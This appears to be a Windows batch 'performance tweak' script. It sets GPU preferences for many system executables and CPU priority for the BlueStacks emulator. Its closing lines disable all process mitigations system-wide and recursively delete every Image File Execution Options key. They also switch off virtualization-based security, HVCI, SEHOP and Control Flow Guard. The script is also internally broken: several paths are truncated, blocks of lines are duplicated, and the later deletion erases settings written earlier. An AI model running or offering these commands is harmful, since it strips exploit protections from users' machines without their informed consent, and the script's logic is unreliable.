Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\poqexec.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PkgMgr.exe" /t REG_SZ /d "GpuPreference=1;" /f     
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\mcbuilder.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MSchedExe.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WUDFCompanionHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WUDFHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\AxInstUI.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\consent.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\LanguageComponentsInstallerComHandler.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\LockAppHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\la57setup.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\lpk-" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\lpksetup.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\lpremove.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\DsmUserTask.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\netcfg.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\runonce.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\secinit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\colorcpl.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dccw.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Dism.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\proquota.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\UserAccountControlSettings.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\shutdown.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\efsui.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cipher.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\edpnotify.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\MicrosoftEdgeCP.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\rekeywiz.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dnscacheugc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\nslookup.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\lodctr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\unlodctr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ddodiag.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\omadmclient.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\omadmprc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\DmOmaCpMo.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\coredpussvr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\DeviceEnroller.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dmcertinst.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dmcfghost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CredentialUIBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SensorDataService.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SecurityHealthHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\prproc.exe" /t REG_SZ /d "GpuPreference=1;" /f     
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\bcdboot.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\bcdedit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\bootsect.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\audiodg.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SpatialAudioLicenseSrv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\CompPkgSrv.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\agentactivationruntimestarter.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\IcsEntitlementHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\XblGameSaveTask.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\notepad.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\TsWpfWrp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\explorer.exe" /t REG_SZ /d "GpuPreference=1;" /f 
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Dism\DismHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cmdkey.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\dpapimig.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\LsaIso.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cscript.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\RmClient.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SecEdit.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wscript.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\icsunattend.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\NetHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cmmon32.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cmstp.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\cmdl32.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\rasautou.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\rasdial.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\rasphone.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ntprint.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\printui.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\DeviceEject.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\powercfg.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\sigverif.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\drvinst.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\hdwwiz.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\pnputil.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\wowreg32.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\InfDefault-" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ndadmin.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\newdev.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\driverquery.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\PnPUnattend.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\oobe\FirstLogonAnim.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\oobe\msoobe.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\oobe\UserOOBEBroker.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\netbtugc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\netiougc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\nbtstat.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\NetCfgNotifyObjectHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\djoin.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\getmac.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\shrpubw.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemPropertiesAdvanced.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemPropertiesComputerName.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemPropertiesHardware.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemPropertiesPerformance.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemPropertiesProtection.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SystemPropertiesRemote.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\winver.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\sxstrace.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Sysprep\sysprep.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WSCollect.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WSReset.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\changepk.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\LicensingUI.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\phoneactivate.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\UpgradeResultsUI.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\GenValObj.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\slui.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\SppExtComObj.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\sppsvc.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\Speech\SpeechUX\SpeechUXWiz.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\snmptrap.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\immersivetpmvscmgrsvr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\rmttpmvscmgrsvr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\tpmvscmgr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\tpmvscmgrsvr.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\OpenWith.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\ThumbnailExtractionHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\verclsid.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\WallpaperHost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\prevhost.exe" /t REG_SZ /d "GpuPreference=1;" /f   
Reg.exe add "HKCU\Software\Microsoft\DirectX\UserGpuPreferences" /v "C:\Windows\System32\rundll32.exe" /t REG_SZ /d "GpuPreference=1;" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v MonitorLatencyTolerance /t REG_DWORD /d "00000000" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v MonitorRefreshLatencyTolerance /t REG_DWORD /d "00000000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Bluestacks.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BstkSVC.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Agent.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Player.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Bluestacks.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BstkSVC.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Agent.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Player.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Bluestacks.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BstkSVC.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Agent.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Player.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Bluestacks.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BstkSVC.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Agent.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Player.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Bluestacks.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BstkSVC.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Agent.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Player.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Bluestacks.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BstkSVC.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Agent.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Player.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Bluestacks.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BstkSVC.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Agent.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Player.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Bluestacks.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BstkSVC.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Agent.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HD-Player.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f
cls
powershell "ForEach($v in (Get-Command -Name \"Set-ProcessMitigation\").Parameters[\"Disable\"].Attributes.ValidValues){Set-ProcessMitigation -System -Disable $v.ToString() -ErrorAction SilentlyContinue}"
cls
powershell "Remove-Item -Path \"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*\" -Recurse -ErrorAction SilentlyContinue" 
cls
reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "DisableExternalDMAUnderLock" /t REG_DWORD /d "0" /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d "0" /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v "HVCIMATRequired" /t REG_DWORD /d "0" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t REG_DWORD /d "0" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f 
